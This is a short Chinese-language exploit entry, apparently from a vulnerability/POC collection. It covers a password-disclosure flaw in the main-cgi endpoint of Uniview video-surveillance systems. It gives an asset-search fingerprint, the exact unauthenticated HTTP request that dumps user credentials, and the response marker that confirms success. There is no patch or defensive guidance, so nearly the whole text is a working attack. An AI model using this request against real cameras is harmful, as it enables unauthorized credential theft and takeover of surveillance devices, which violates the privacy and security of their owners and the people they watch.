# 宇视科技视频监控main-cgi密码泄露漏洞

宇视科技视频监控main-cgi密码泄露 ｜ 信息泄露 ｜ —
- **指纹**：`app="uniview-视频监控"`
- **请求**：`GET /cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1} HTTP/1.1`
- **响应特征**：200 UserName